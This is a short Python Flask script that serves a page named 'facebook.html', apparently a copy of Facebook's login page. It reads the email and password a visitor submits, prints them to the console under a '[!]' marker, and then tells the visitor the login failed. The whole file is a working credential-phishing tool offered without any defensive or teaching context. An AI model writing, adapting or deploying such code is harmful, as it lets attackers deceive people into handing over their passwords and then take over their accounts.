from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['pass']
        print(f"[!] Email: {email} | Password: {password}")
        return "Login failed. Please try again."
    return render_template('facebook.html')

if __name__ == '__main__':
    app.run(debug=True)
